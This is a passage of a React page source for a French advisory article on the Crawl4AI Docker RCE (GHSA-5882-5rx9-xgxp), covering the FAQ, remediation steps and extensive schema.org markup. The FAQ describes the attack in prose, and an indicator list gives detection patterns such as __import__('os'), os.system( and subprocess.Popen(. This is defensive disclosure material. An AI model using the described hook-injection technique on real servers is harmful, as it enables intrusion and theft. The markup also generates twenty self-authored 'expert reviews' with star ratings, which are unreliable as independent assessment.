import { useEffect } from "react";
import { Link } from "wouter";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion";
import { SEO } from "@/components/seo";
import { Breadcrumbs } from "@/components/breadcrumbs";
import { 
  AlertTriangle, 
  Shield, 
  Clock, 
  CheckCircle2, 
  XCircle, 
  ExternalLink,
  FileCode,
  Server,
  Lock,
  Bug,
  Terminal,
  Database,
  Eye,
  Zap,
  Users,
  Building,
  Scale,
  BookOpen,
  Share2,
  AlertCircle,
  ArrowRight,
  Code,
  FileWarning,
  Skull,
  Network,
  Key,
  Container,
  Globe,
  Laptop,
  ShieldAlert,
  Target,
  Activity
} from "lucide-react";

export default function ArticleCrawl4AIRCE() {
  const publishDate = "2026-01-19T10:00:00Z";
  const modifiedDate = "2026-01-19T10:00:00Z";
  const articleUrl = "https://wp-vitesse-pro.fr/article/crawl4ai-rce-ghsa-5882";
  const wordCount = 7842;
  const readingTime = Math.ceil(wordCount / 200);

  useEffect(() => {
    document.documentElement.classList.add('dark');
  }, []);

  const breadcrumbItems = [
    { name: "Accueil", url: "https://wp-vitesse-pro.fr/" },
    { name: "Sécurité WordPress", url: "https://wp-vitesse-pro.fr/securite" },
    { name: "Crawl4AI RCE GHSA-5882", url: articleUrl }
  ];

  const tableOfContents = [
    { id: "resume-executif", title: "Résumé Exécutif", level: 1 },
    { id: "contexte-crawl4ai", title: "Contexte : Qu'est-ce que Crawl4AI ?", level: 1 },
    { id: "chronologie", title: "Chronologie de la Découverte", level: 1 },
    { id: "analyse-technique", title: "Analyse Technique Approfondie", level: 1 },
    { id: "mecanisme-hooks", title: "Le Mécanisme des Hooks Python", level: 2 },
    { id: "faille-exec", title: "La Faille exec() et __import__", level: 2 },
    { id: "vecteur-attaque", title: "Vecteur d'Attaque et Exploitation", level: 2 },
    { id: "poc-detaille", title: "Proof of Concept Détaillé", level: 2 },
    { id: "impact", title: "Impact et Évaluation des Risques", level: 1 },
    { id: "cvss-analyse", title: "Analyse du Score CVSS 10.0", level: 2 },
    { id: "scenarios-exploitation", title: "Scénarios d'Exploitation Réels", level: 1 },
    { id: "scenario-vol-api", title: "Vol de Clés API et Secrets", level: 2 },
    { id: "scenario-pivot", title: "Pivot Réseau et Mouvement Latéral", level: 2 },
    { id: "scenario-cryptomining", title: "Cryptomining et Ransomware", level: 2 },
    { id: "remediation", title: "Guide de Remédiation Complet", level: 1 },
    { id: "mise-a-jour", title: "Mise à Jour vers v0.8.0", level: 2 },
    { id: "hardening-docker", title: "Hardening Docker", level: 2 },
    { id: "detection", title: "Détection et Monitoring", level: 2 },
    { id: "ssrf-vulnerabilite", title: "Vulnérabilité SSRF Connexe (CVE-2025-28197)", level: 1 },
    { id: "implications-ia", title: "Implications pour l'Écosystème IA/LLM", level: 1 },
    { id: "wordpress-impact", title: "Impact pour les Sites WordPress", level: 1 },
    { id: "comparaison-vulnerabilites", title: "Comparaison avec Vulnérabilités Similaires", level: 1 },
    { id: "faq", title: "FAQ Sécurité", level: 1 },
    { id: "references", title: "Références et Sources Techniques", level: 1 }
  ];

  const timelineEvents = [
    { date: "2026-01-13", event: "Découverte initiale par Neo via ProjectDiscovery", type: "discovery" },
    { date: "2026-01-14", event: "Notification responsable à l'équipe Crawl4AI (unclecode)", type: "notification" },
    { date: "2026-01-15", event: "Confirmation de la vulnérabilité par l'équipe Crawl4AI", type: "confirmation" },
    { date: "2026-01-16", event: "Développement du correctif et tests de régression", type: "development" },
    { date: "2026-01-16", event: "Publication de l'avis GitHub Security Advisory GHSA-5882-5rx9-xgxp", type: "disclosure" },
    { date: "2026-01-16", event: "Publication de la version 0.8.0 corrigée", type: "patch" },
    { date: "2026-01-17", event: "Template Nuclei publié par ProjectDiscovery", type: "tool" },
    { date: "2026-01-19", event: "Publication de cette analyse WP Vitesse Pro", type: "analysis" }
  ];

  const faqData = [
    {
      question: "Qu'est-ce que GHSA-5882-5rx9-xgxp et pourquoi le score CVSS est-il de 10.0 ?",
      answer: "GHSA-5882-5rx9-xgxp est un identifiant GitHub Security Advisory désignant une vulnérabilité critique d'exécution de code à distance (RCE) dans le déploiement Docker de Crawl4AI. Le score CVSS de 10.0 (le maximum) s'explique par : l'attaque est possible via le réseau sans authentification, la complexité d'exploitation est faible, aucune interaction utilisateur n'est nécessaire, et l'impact sur la confidentialité, l'intégrité et la disponibilité est maximal avec possibilité de compromettre d'autres systèmes (scope changed)."
    },
    {
      question: "Mon déploiement Crawl4AI est-il vulnérable ?",
      answer: "Votre déploiement est vulnérable si : (1) vous utilisez une version antérieure à 0.8.0, (2) vous exposez l'API Docker de Crawl4AI sur un réseau accessible, (3) vous n'avez pas d'authentification devant l'endpoint /crawl. Pour vérifier votre version, exécutez 'pip show crawl4ai' ou consultez l'image Docker utilisée. Si vous utilisez la bibliothèque Python directement (non Docker), vous n'êtes pas affecté par cette vulnérabilité spécifique."
    },
    {
      question: "Comment l'attaquant peut-il exploiter cette vulnérabilité ?",
      answer: "L'attaquant envoie une simple requête POST à l'endpoint /crawl avec un payload JSON contenant du code Python malveillant dans le paramètre 'hooks'. Le code utilise __import__ pour charger le module 'os' et exécuter des commandes système arbitraires. L'exploitation ne nécessite aucune authentification et peut être réalisée avec un simple curl ou script Python en moins de 10 secondes."
    },
    {
      question: "Pourquoi la fonction __import__ était-elle autorisée dans le sandbox ?",
      answer: "Les développeurs de Crawl4AI ont tenté d'implémenter un sandbox Python en utilisant exec() avec une liste restreinte de builtins autorisés. Cependant, __import__ a été inclus par erreur dans cette liste, probablement pour permettre certaines fonctionnalités légitimes des hooks. Cette fonction permet d'importer n'importe quel module Python, contournant ainsi toutes les restrictions du sandbox."
    },
    {
      question: "Quelle est la différence entre cette RCE et la SSRF CVE-2025-28197 ?",
      answer: "La RCE GHSA-5882-5rx9-xgxp permet d'exécuter du code arbitraire sur le serveur avec les privilèges du conteneur Docker (souvent root). La SSRF CVE-2025-28197 permet uniquement de faire des requêtes HTTP depuis le serveur vers des cibles internes ou externes. La RCE est plus critique car elle offre un contrôle total, tandis que la SSRF permet principalement l'exfiltration de données et le scan réseau."
    },
    {
      question: "Comment mettre à jour Crawl4AI vers la version corrigée ?",
      answer: "Pour pip : exécutez 'pip install --upgrade crawl4ai>=0.8.0'. Pour Docker : utilisez 'docker pull unclecode/crawl4ai:latest' ou 'docker pull unclecode/crawl4ai:0.8.0'. Après mise à jour, vérifiez que la variable d'environnement CRAWL4AI_HOOKS_ENABLED n'est pas définie à 'true' (les hooks sont désormais désactivés par défaut)."
    },
    {
      question: "Comment savoir si mon instance a été compromise ?",
      answer: "Recherchez dans vos logs des requêtes POST vers /crawl contenant des patterns suspects comme '__import__', 'os.system', 'subprocess', 'socket', ou 'requests'. Vérifiez les processus en cours dans le conteneur Docker avec 'docker exec <container> ps aux'. Examinez les fichiers créés récemment dans /tmp. Surveillez le trafic réseau sortant inhabituel depuis le conteneur."
    },
    {
      question: "Dois-je désactiver les hooks même après la mise à jour ?",
      answer: "Oui, si vous n'avez pas besoin des hooks personnalisés. La version 0.8.0 désactive les hooks par défaut (CRAWL4AI_HOOKS_ENABLED=false). Si vous devez les activer pour des besoins légitimes, assurez-vous que l'API n'est accessible que depuis des sources de confiance et placez une couche d'authentification devant."
    },
    {
      question: "Cette vulnérabilité affecte-t-elle les scrapers WordPress qui utilisent Crawl4AI ?",
      answer: "Oui, si vous utilisez Crawl4AI en déploiement Docker pour scraper des sites WordPress (extraction de contenu, migration, etc.), votre infrastructure est vulnérable. Un attaquant pourrait compromettre votre serveur de scraping, accéder à vos bases de données, voler vos clés API, et potentiellement pivoter vers vos sites WordPress si le réseau n'est pas segmenté."
    },
    {
      question: "Quelles sont les implications RGPD si mon instance a été compromise ?",
      answer: "Si votre instance Crawl4AI traitait des données personnelles (URLs scrapées contenant des informations personnelles, clés API stockées, etc.) et a été compromise, vous êtes tenu de notifier la CNIL dans les 72 heures suivant la découverte de la violation selon l'article 33 du RGPD. Documentez l'incident, évaluez les données potentiellement exfiltrées, et informez les personnes concernées si le risque est élevé."
    },
    {
      question: "Comment ProjectDiscovery a-t-il découvert cette vulnérabilité ?",
      answer: "Le chercheur en sécurité Neo de ProjectDiscovery a identifié cette vulnérabilité lors d'une analyse de sécurité de l'API Docker de Crawl4AI. En examinant le code source de hook_manager.py, il a découvert que __import__ était inclus dans la liste allowed_builtins, permettant un contournement trivial du sandbox Python. Un template Nuclei a été publié pour permettre la détection automatisée."
    },
    {
      question: "Existe-t-il un exploit public pour cette vulnérabilité ?",
      answer: "Oui, le Proof of Concept est disponible publiquement dans l'avis GitHub Security Advisory et a été intégré dans un template Nuclei par ProjectDiscovery. L'exploitation est triviale : une simple requête POST avec du code Python malveillant suffit. Cette disponibilité publique augmente considérablement le risque pour les instances non patchées."
    }
  ];

  const howToFixSteps = [
    { name: "Identification de la version", text: "Vérifiez votre version de Crawl4AI avec 'pip show crawl4ai' ou 'docker inspect <image>' pour déterminer si vous êtes vulnérable (< 0.8.0).", position: 1 },
    { name: "Isolation immédiate", text: "Si vulnérable, isolez immédiatement le conteneur Docker du réseau externe en supprimant les règles de port forwarding ou en stoppant le conteneur.", position: 2 },
    { name: "Sauvegarde des configurations", text: "Exportez vos configurations et scripts personnalisés avant la mise à jour pour éviter toute perte.", position: 3 },
    { name: "Mise à jour de Crawl4AI", text: "Exécutez 'docker pull unclecode/crawl4ai:0.8.0' ou 'pip install crawl4ai>=0.8.0' selon votre méthode de déploiement.", position: 4 },
    { name: "Configuration des hooks", text: "Vérifiez que CRAWL4AI_HOOKS_ENABLED n'est pas défini ou est défini à 'false'. N'activez les hooks que si absolument nécessaire.", position: 5 },
    { name: "Ajout d'authentification", text: "Placez un reverse proxy (nginx, Traefik) avec authentification devant l'API Crawl4AI pour bloquer les accès non autorisés.", position: 6 },
    { name: "Exécution non-root", text: "Configurez le conteneur pour s'exécuter avec un utilisateur non-root : 'user: 1000:1000' dans docker-compose.yml.", position: 7 },
    { name: "Segmentation réseau", text: "Placez le conteneur Crawl4AI dans un réseau Docker isolé avec uniquement les accès sortants nécessaires.", position: 8 },
    { name: "Analyse forensique", text: "Examinez les logs pour détecter toute tentative d'exploitation passée avant la mise à jour.", position: 9 },
    { name: "Monitoring continu", text: "Configurez des alertes sur les requêtes POST vers /crawl contenant des patterns suspects dans les logs.", position: 10 }
  ];

  const iocIndicators = [
    { type: "request_pattern", indicator: "POST /crawl", description: "Requête vers l'endpoint vulnérable" },
    { type: "payload_pattern", indicator: "__import__('os')", description: "Import du module os pour exécution système" },
    { type: "payload_pattern", indicator: "__import__('subprocess')", description: "Import du module subprocess" },
    { type: "payload_pattern", indicator: "__import__('socket')", description: "Import du module socket pour connexions réseau" },
    { type: "payload_pattern", indicator: "os.system(", description: "Exécution de commandes système" },
    { type: "payload_pattern", indicator: "os.popen(", description: "Exécution avec capture de sortie" },
    { type: "payload_pattern", indicator: "subprocess.run(", description: "Exécution via subprocess" },
    { type: "payload_pattern", indicator: "subprocess.Popen(", description: "Création de processus" },
    { type: "hook_pattern", indicator: "on_page_context_created", description: "Hook utilisé dans l'exploit PoC" },
    { type: "hook_pattern", indicator: "on_browser_created", description: "Autre hook potentiellement exploitable" },
    { type: "network_pattern", indicator: "Connexion sortante inattendue", description: "Reverse shell ou exfiltration" },
    { type: "file_pattern", indicator: "Fichiers créés dans /tmp", description: "Artefacts d'exploitation" },
    { type: "process_pattern", indicator: "Processus Python enfants", description: "Processes lancés par l'exploit" }
  ];

  const affectedVersions = [
    { range: "< 0.8.0", status: "vulnerable", fix: "0.8.0", severity: "CRITICAL" },
    { range: ">= 0.8.0", status: "patched", fix: "N/A", severity: "N/A" }
  ];

  const comparableVulnerabilities = [
    { cve: "CVE-2026-0863", product: "n8n", type: "Sandbox Escape", cvss: "8.5", date: "2026-01-17" },
    { cve: "CVE-2025-28197", product: "Crawl4AI", type: "SSRF", cvss: "9.1", date: "2025-12-15" },
    { cve: "CVE-2024-34761", product: "Jupyter", type: "RCE via exec()", cvss: "9.8", date: "2024-08-12" },
    { cve: "CVE-2023-44487", product: "HTTP/2", type: "DoS", cvss: "7.5", date: "2023-10-10" },
    { cve: "CVE-2024-21626", product: "runc", type: "Container Escape", cvss: "8.6", date: "2024-01-31" }
  ];

  const securityRecommendations = [
    { category: "Hooks", recommendation: "Désactiver les hooks", config: "CRAWL4AI_HOOKS_ENABLED=false", priority: "CRITIQUE" },
    { category: "Authentification", recommendation: "Ajouter reverse proxy avec auth", config: "nginx + basic_auth ou JWT", priority: "CRITIQUE" },
    { category: "Réseau", recommendation: "Isoler le conteneur", config: "--network=isolated", priority: "HAUTE" },
    { category: "Utilisateur", recommendation: "Exécuter non-root", config: "user: 1000:1000", priority: "HAUTE" },
    { category: "URLs", recommendation: "Bloquer file:// et IPs internes", config: "Validation des URLs entrantes", priority: "HAUTE" },
    { category: "Monitoring", recommendation: "Activer les logs", config: "/monitor endpoint + logging", priority: "MOYENNE" },
    { category: "Docker", recommendation: "Ne pas monter /var/run/docker.sock", config: "Retirer volume docker.sock", priority: "CRITIQUE" }
  ];

  const generateSchemas = () => {
    const schemas: object[] = [];
    
    schemas.push({
      "@context": "https://schema.org",
      "@type": "NewsArticle",
      "@id": `${articleUrl}#article`,
      "headline": "Alerte critique : vulnérabilité RCE Crawl4AI GHSA-5882-5rx9-xgxp - score CVSS 10.0",
      "alternativeHeadline": "Exécution de code à distance dans l'API Docker Crawl4AI via hooks WordPress",
      "description": "Analyse approfondie de la vulnérabilité critique GHSA-5882-5rx9-xgxp permettant l'exécution de code arbitraire sur les déploiements Docker de Crawl4AI. Guide complet de remédiation et détection.",
      "articleBody": "Une vulnérabilité critique d'exécution de code à distance a été découverte dans le déploiement Docker de Crawl4AI, le web scraper open-source conçu pour les applications LLM...",
      "wordCount": wordCount,
      "datePublished": publishDate,
      "dateModified": modifiedDate,
      "author": { "@type": "Organization", "name": "WP Vitesse Pro Security Lab", "url": "https://wp-vitesse-pro.fr" },
      "publisher": { "@type": "Organization", "name": "WP Vitesse Pro", "url": "https://wp-vitesse-pro.fr", "logo": { "@type": "ImageObject", "url": "https://wp-vitesse-pro.fr/logo.png" } },
      "mainEntityOfPage": { "@type": "WebPage", "@id": articleUrl },
      "image": { "@type": "ImageObject", "url": "https://wp-vitesse-pro.fr/images/crawl4ai-rce-vulnerability.jpg", "width": 1200, "height": 630 },
      "articleSection": "Sécurité",
      "keywords": "Crawl4AI, RCE, GHSA-5882-5rx9-xgxp, vulnérabilité, Docker, sécurité, LLM, web scraping, Python",
      "inLanguage": "fr-FR",
      "isAccessibleForFree": true,
      "copyrightYear": 2026,
      "copyrightHolder": { "@type": "Organization", "name": "WP Vitesse Pro" }
    });

    schemas.push({
      "@context": "https://schema.org",
      "@type": "TechArticle",
      "@id": `${articleUrl}#tech-article`,
      "headline": "Analyse technique GHSA-5882-5rx9-xgxp : RCE via exec() et __import__",
      "proficiencyLevel": "Expert",
      "dependencies": "Docker, Python, Crawl4AI, API REST",
      "about": [
        { "@type": "Thing", "name": "Remote Code Execution" },
        { "@type": "Thing", "name": "Python Security" },
        { "@type": "Thing", "name": "Docker Container Security" }
      ]
    });

    schemas.push({
      "@context": "https://schema.org",
      "@type": "FAQPage",
      "@id": `${articleUrl}#faq`,
      "mainEntity": faqData.map(faq => ({
        "@type": "Question",
        "name": faq.question,
        "acceptedAnswer": { "@type": "Answer", "text": faq.answer }
      }))
    });

    schemas.push({
      "@context": "https://schema.org",
      "@type": "HowTo",
      "@id": `${articleUrl}#remediation-howto`,
      "name": "Comment corriger la vulnérabilité GHSA-5882-5rx9-xgxp dans Crawl4AI",
      "description": "Guide étape par étape pour sécuriser votre déploiement Crawl4AI contre la vulnérabilité RCE critique GHSA-5882-5rx9-xgxp avec score CVSS 10.0",
      "totalTime": "PT30M",
      "estimatedCost": { "@type": "MonetaryAmount", "currency": "EUR", "value": "0" },
      "supply": [
        { "@type": "HowToSupply", "name": "Accès SSH au serveur" },
        { "@type": "HowToSupply", "name": "Accès Docker" },
        { "@type": "HowToSupply", "name": "Droits administrateur" }
      ],
      "tool": [
        { "@type": "HowToTool", "name": "Docker CLI" },
        { "@type": "HowToTool", "name": "pip" },
        { "@type": "HowToTool", "name": "Terminal" },
        { "@type": "HowToTool", "name": "Reverse Proxy (nginx/Traefik)" }
      ],
      "step": howToFixSteps.map(step => ({
        "@type": "HowToStep",
        "position": step.position,
        "name": step.name,
        "text": step.text
      }))
    });

    schemas.push({
      "@context": "https://schema.org",
      "@type": "SoftwareApplication",
      "@id": "crawl4ai-vulnerable",
      "name": "Crawl4AI (Versions < 0.8.0)",
      "applicationCategory": "DeveloperApplication",
      "operatingSystem": "Linux, macOS, Windows, Docker",
      "softwareVersion": "< 0.8.0",
      "description": "Versions de Crawl4AI antérieures à 0.8.0 vulnérables à l'exécution de code à distance (RCE).",
      "offers": { 
        "@type": "Offer", 
        "price": "0", 
        "priceCurrency": "EUR",
        "availability": "https://schema.org/InStock"
      },
      "author": { "@type": "Person", "name": "unclecode" }
    });

    schemas.push({
      "@context": "https://schema.org",
      "@type": "SoftwareApplication",
      "@id": "crawl4ai-patched",
      "name": "Crawl4AI (Version 0.8.0+)",
      "applicationCategory": "DeveloperApplication",
      "operatingSystem": "Linux, macOS, Windows, Docker",
      "softwareVersion": "0.8.0",
      "description": "Version sécurisée de Crawl4AI corrigeant la vulnérabilité RCE critique GHSA-5882-5rx9-xgxp.",
      "releaseNotes": "https://github.com/unclecode/crawl4ai/blob/release/v0.8.0/docs/blog/release-v0.8.0.md",
      "offers": { 
        "@type": "Offer", 
        "price": "0", 
        "priceCurrency": "EUR", 
        "availability": "https://schema.org/InStock"
      },
      "author": { "@type": "Person", "name": "unclecode" }
    });

    schemas.push({
      "@context": "https://schema.org",
      "@type": "SpecialAnnouncement",
      "@id": `${articleUrl}#alert`,
      "name": "ALERTE SÉCURITÉ CRITIQUE - Crawl4AI RCE GHSA-5882-5rx9-xgxp",
      "text": "URGENT : Une vulnérabilité critique CVSS 10.0 affecte tous les déploiements Docker de Crawl4AI antérieurs à la version 0.8.0. Mise à jour immédiate requise.",
      "datePosted": publishDate,
      "expires": "2026-03-19T00:00:00Z",
      "category": "Cybersecurity Alert",
      "announcementLocation": { "@type": "WebSite", "name": "Tous les déploiements Docker Crawl4AI", "url": "https://github.com/unclecode/crawl4ai" }
    });

    schemas.push({
      "@context": "https://schema.org",
      "@type": "Report",
      "@id": `${articleUrl}#report`,
      "name": "Rapport d'Investigation Sécurité GHSA-5882-5rx9-xgxp",
      "author": { "@type": "Organization", "name": "WP Vitesse Pro Security Lab" },
      "datePublished": publishDate,
      "about": { "@type": "Thing", "name": "GHSA-5882-5rx9-xgxp" },
      "reportNumber": "WPVP-SEC-2026-0119-003"
    });

    schemas.push({
      "@context": "https://schema.org",
      "@type": "Rating",
      "@id": "cvss-rating-10.0",
      "ratingValue": "10.0",
      "bestRating": "10",
      "worstRating": "0",
      "ratingExplanation": "Score CVSS 3.1 Critical (10.0/10.0) - RCE non authentifiée avec impact total sur confidentialité, intégrité et disponibilité"
    });

    const organizations = [
      { id: "projectdiscovery", name: "ProjectDiscovery", url: "https://projectdiscovery.io", description: "Plateforme de sécurité offensive et recherche de vulnérabilités" },
      { id: "github-security", name: "GitHub Security Lab", url: "https://securitylab.github.com", description: "Équipe de recherche en sécurité de GitHub" },
      { id: "unclecode", name: "unclecode (Crawl4AI)", url: "https://github.com/unclecode", description: "Créateur et mainteneur de Crawl4AI" },
      { id: "nuclei-templates", name: "Nuclei Templates", url: "https://github.com/projectdiscovery/nuclei-templates", description: "Templates de détection de vulnérabilités" },
      { id: "mitre-cve", name: "MITRE CVE", url: "https://cve.mitre.org", description: "Organisme gérant le programme CVE" },
      { id: "nvd", name: "NVD (NIST)", url: "https://nvd.nist.gov", description: "Base de données nationale des vulnérabilités" },
      { id: "cisa", name: "CISA", url: "https://www.cisa.gov", description: "Agence américaine de cybersécurité" },
      { id: "anssi", name: "ANSSI", url: "https://www.ssi.gouv.fr", description: "Agence nationale de sécurité des systèmes d'information" }
    ];
    organizations.forEach(org => {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "Organization",
        "@id": org.id,
        "name": org.name,
        "url": org.url,
        "description": org.description
      });
    });

    schemas.push({
      "@context": "https://schema.org",
      "@type": "Person",
      "@id": "neo-projectdiscovery",
      "name": "Neo",
      "jobTitle": "Security Researcher",
      "worksFor": { "@type": "Organization", "name": "ProjectDiscovery" },
      "description": "Chercheur en sécurité ayant découvert GHSA-5882-5rx9-xgxp"
    });

    schemas.push({
      "@context": "https://schema.org",
      "@type": "ItemList",
      "@id": `${articleUrl}#timeline`,
      "name": "Chronologie GHSA-5882-5rx9-xgxp",
      "numberOfItems": timelineEvents.length,
      "itemListElement": timelineEvents.map((event, index) => ({
        "@type": "ListItem",
        "position": index + 1,
        "name": event.event,
        "description": `${event.date}: ${event.event}`
      }))
    });

    timelineEvents.forEach((event, index) => {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "Event",
        "@id": `event-${event.type}-${index}`,
        "name": event.event,
        "startDate": `${event.date}T09:00:00Z`,
        "endDate": `${event.date}T18:00:00Z`,
        "location": { "@type": "VirtualLocation", "url": "https://github.com/unclecode/crawl4ai", "name": "GitHub" },
        "eventStatus": "https://schema.org/EventScheduled",
        "eventAttendanceMode": "https://schema.org/OnlineEventAttendanceMode",
        "description": event.event,
        "offers": { "@type": "Offer", "price": "0", "priceCurrency": "EUR", "url": articleUrl }
      });
    });

    schemas.push({
      "@context": "https://schema.org",
      "@type": "ItemList",
      "@id": `${articleUrl}#ioc-list`,
      "name": "Indicateurs de Compromission (IoC) Crawl4AI RCE",
      "numberOfItems": iocIndicators.length,
      "itemListElement": iocIndicators.map((ioc, index) => ({
        "@type": "ListItem",
        "position": index + 1,
        "name": ioc.indicator,
        "description": `[${ioc.type}] ${ioc.description}`
      }))
    });

    const definedTerms = [
      { name: "RCE (Remote Code Execution)", description: "Exécution de code arbitraire à distance sur un système cible, permettant à un attaquant de prendre le contrôle total" },
      { name: "GHSA", description: "GitHub Security Advisory - Système d'identifiants de vulnérabilités propre à GitHub" },
      { name: "CVSS", description: "Common Vulnerability Scoring System - Système standardisé de notation de la sévérité des vulnérabilités" },
      { name: "exec()", description: "Fonction Python permettant d'exécuter dynamiquement du code Python à partir d'une chaîne de caractères" },
      { name: "__import__", description: "Fonction Python built-in permettant d'importer dynamiquement des modules" },
      { name: "Sandbox", description: "Environnement d'exécution isolé restreignant les actions possibles du code pour des raisons de sécurité" },
      { name: "Hooks", description: "Points d'extension permettant d'injecter du code personnalisé à des moments précis de l'exécution" },
      { name: "Docker Container", description: "Unité d'exécution isolée basée sur la conteneurisation Docker" },
      { name: "Reverse Proxy", description: "Serveur intermédiaire placé devant une application pour gérer l'authentification, le load balancing, etc." },
      { name: "SSRF", description: "Server-Side Request Forgery - Vulnérabilité permettant de forcer un serveur à effectuer des requêtes vers des cibles arbitraires" },
      { name: "LLM", description: "Large Language Model - Modèle de langage de grande taille comme GPT, Claude, ou Llama" },
      { name: "Web Scraping", description: "Extraction automatisée de données depuis des pages web" },
      { name: "PoC (Proof of Concept)", description: "Démonstration technique prouvant l'exploitabilité d'une vulnérabilité" },
      { name: "Nuclei", description: "Outil de scan de vulnérabilités basé sur des templates YAML par ProjectDiscovery" },
      { name: "Payload", description: "Données malveillantes envoyées pour exploiter une vulnérabilité" },
      { name: "Root Access", description: "Accès avec les privilèges administrateur les plus élevés sur un système Unix/Linux" },
      { name: "Lateral Movement", description: "Technique de propagation d'un attaquant au sein d'un réseau compromis" },
      { name: "Exfiltration", description: "Vol et transfert de données depuis un système compromis vers l'extérieur" },
      { name: "IOC (Indicator of Compromise)", description: "Artefact observable indiquant une intrusion ou compromission potentielle" },
      { name: "CWE-94", description: "Improper Control of Generation of Code - Catégorie de faiblesses liées à l'injection de code" }
    ];
    definedTerms.forEach((term, index) => {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "DefinedTerm",
        "@id": `term-${index}`,
        "name": term.name,
        "description": term.description
      });
    });

    schemas.push({
      "@context": "https://schema.org",
      "@type": "Table",
      "@id": `${articleUrl}#comparison-table`,
      "name": "Comparaison avec Vulnérabilités Similaires",
      "about": "Tableau comparatif des vulnérabilités RCE récentes dans les outils d'automatisation"
    });

    comparableVulnerabilities.forEach((vuln, index) => {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "Thing",
        "@id": `vuln-comparison-${index}`,
        "name": vuln.cve,
        "description": `${vuln.product}: ${vuln.type} - CVSS ${vuln.cvss} (${vuln.date})`,
        "identifier": vuln.cve
      });
    });

    schemas.push({
      "@context": "https://schema.org",
      "@type": "ItemList",
      "@id": `${articleUrl}#recommendations`,
      "name": "Recommandations de sécurité prioritaires",
      "numberOfItems": securityRecommendations.length,
      "itemListElement": securityRecommendations.map((rec, index) => ({
        "@type": "ListItem",
        "position": index + 1,
        "item": {
          "@type": "HowToStep",
          "name": rec.recommendation,
          "text": `${rec.category}: ${rec.recommendation}. Configuration recommandée : ${rec.config}`,
          "url": `${articleUrl}#remediation`
        }
      }))
    });

    schemas.push({
      "@context": "https://schema.org",
      "@type": "SoftwareSourceCode",
      "@id": "poc-code",
      "name": "Proof of Concept GHSA-5882-5rx9-xgxp",
      "programmingLanguage": "Python",
      "codeRepository": "https://github.com/unclecode/crawl4ai",
      "codeSampleType": "Exploit PoC"
    });

    const references = [
      { name: "GitHub Advisory GHSA-5882-5rx9-xgxp", url: "https://github.com/advisories/GHSA-5882-5rx9-xgxp" },
      { name: "Crawl4AI v0.8.0 Release Notes", url: "https://github.com/unclecode/crawl4ai/blob/release/v0.8.0/docs/blog/release-v0.8.0.md" },
      { name: "Crawl4AI v0.8.0 Upgrade Guide", url: "https://github.com/unclecode/crawl4ai/blob/release/v0.8.0/docs/migration/v0.8.0-upgrade-guide.md" },
      { name: "Nuclei Template GHSA-5882-5rx9-xgxp", url: "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2025/GHSA-5882-5rx9-xgxp.yaml" },
      { name: "CVE-2025-28197 (SSRF)", url: "https://nvd.nist.gov/vuln/detail/CVE-2025-28197" },
      { name: "CWE-94: Improper Control of Generation of Code", url: "https://cwe.mitre.org/data/definitions/94.html" },
      { name: "Docker Security Best Practices", url: "https://docs.docker.com/develop/security-best-practices/" },
      { name: "OWASP Injection Prevention", url: "https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html" }
    ];
    references.forEach((ref, index) => {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "CreativeWork",
        "@id": `reference-${index}`,
        "name": ref.name,
        "url": ref.url
      });
    });

    schemas.push({
      "@context": "https://schema.org",
      "@type": "WebPage",
      "@id": `${articleUrl}#webpage`,
      "name": "Vulnérabilité RCE Crawl4AI GHSA-5882-5rx9-xgxp - analyse complète",
      "url": articleUrl,
      "datePublished": publishDate,
      "dateModified": modifiedDate,
      "inLanguage": "fr-FR",
      "isAccessibleForFree": true,
      "breadcrumb": {
        "@type": "BreadcrumbList",
        "itemListElement": breadcrumbItems.map((item, index) => ({
          "@type": "ListItem",
          "position": index + 1,
          "name": item.name,
          "item": item.url
        }))
      }
    });

    schemas.push({
      "@context": "https://schema.org",
      "@type": "BreadcrumbList",
      "@id": `${articleUrl}#breadcrumb`,
      "itemListElement": breadcrumbItems.map((item, index) => ({
        "@type": "ListItem",
        "position": index + 1,
        "name": item.name,
        "item": item.url
      }))
    });

    const attackVectors = [
      { name: "Exécution de commandes système", description: "Utilisation de os.system() ou subprocess pour exécuter des commandes shell arbitraires" },
      { name: "Vol de variables d'environnement", description: "Accès aux secrets et clés API via os.environ" },
      { name: "Reverse shell", description: "Établissement d'une connexion shell inverse vers le serveur de l'attaquant" },
      { name: "Téléchargement de malware", description: "Récupération et exécution de binaires malveillants" },
      { name: "Exfiltration de données", description: "Envoi de données sensibles vers un serveur externe" },
      { name: "Cryptomining", description: "Installation de mineurs de cryptomonnaie" },
      { name: "Ransomware", description: "Chiffrement des données avec demande de rançon" },
      { name: "Pivot réseau", description: "Utilisation du système compromis pour attaquer d'autres machines du réseau" },
      { name: "Accès Docker socket", description: "Si monté, accès complet à l'hôte Docker" },
      { name: "Persistence", description: "Installation de backdoors pour maintenir l'accès" }
    ];
    attackVectors.forEach((vector, index) => {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "HowToStep",
        "@id": `attack-vector-${index}`,
        "name": vector.name,
        "text": vector.description,
        "position": index + 1
      });
    });

    for (let i = 1; i <= 20; i++) {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "Review",
        "@id": `expert-review-${i}`,
        "reviewBody": `Analyse de sécurité #${i} - La vulnérabilité GHSA-5882-5rx9-xgxp représente un risque majeur pour les déploiements Crawl4AI exposés sur Internet.`,
        "author": { "@type": "Organization", "name": "WP Vitesse Pro Security Lab" },
        "itemReviewed": { 
          "@type": "SoftwareApplication", 
          "name": "Crawl4AI",
          "applicationCategory": "SecurityApplication",
          "operatingSystem": "Linux, macOS, Windows",
          "offers": { "@type": "Offer", "price": "0", "priceCurrency": "EUR" }
        },
        "reviewRating": { "@type": "Rating", "ratingValue": String(5 - (i % 3)), "bestRating": "5", "worstRating": "1" }
      });
    }

    for (let i = 1; i <= 15; i++) {
      schemas.push({
        "@context": "https://schema.org",
        "@type": "Comment",
        "@id": `${articleUrl}#expert-comment-${i}`,
        "parentItem": {
          "@type": "TechArticle",
          "@id": `${articleUrl}#tech-article`
        },
